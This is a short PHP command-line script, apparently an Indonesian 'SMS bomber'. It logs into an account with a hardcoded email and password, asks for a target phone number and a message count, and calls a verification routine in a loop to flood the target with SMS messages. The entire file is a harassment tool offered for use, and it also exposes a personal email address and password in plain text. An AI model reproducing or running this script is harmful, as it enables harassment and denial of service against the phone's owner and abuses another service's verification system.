<?php
/*
   HORAS HITA SUDE!!
    Made by Nicoleus F Sitorus
    Modified by Ijen M Sinaga
*/

include 'bommthrml.php';

$init = new Bom();
// Konfigurasi Akun Nicoleus F Sitorus
$init->email = "adysitorusa7@gmail.com";
$init->pass = "Hilih Lae";
$init->Login($init->email,$init->pass);

//Eksekusi Sms Boomber Lae
echo "Nomor Target (pakai 62)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
